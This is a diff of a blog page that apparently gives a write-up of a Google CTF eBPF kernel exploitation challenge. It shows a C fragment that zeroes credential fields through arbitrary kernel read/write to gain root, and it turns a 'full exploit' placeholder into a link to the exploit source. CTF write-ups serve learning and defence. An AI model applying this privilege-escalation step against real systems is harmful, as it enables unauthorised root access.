@@ -108,7 +108,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (curr_cred &amp;&amp; curr_real_cred) &#123;</span><br><span class="line">    <span class="keyword">long</span> data = read64(curr_real_cred);</span><br><span class="line">    write64(curr_real_cred + <span class="number">4</span>, data &amp; <span class="number">0xffffffff00000000</span>);</span><br><span class="line">    write64(curr_real_cred + <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    write64(curr_real_cred + <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/f130ab92-7021-48a0-8c3e-a484919e0419.png" alt="Untitled"></p>
-<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>code</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p><a href="https://github.com/l0ca1/l0ca1.github.io/blob/master/code/google-ctf-pwn-ebpf/google-ctf-pwn-ebpf-exp.c" target="_blank" rel="noopener">code</a></p>
 
       
     </div>
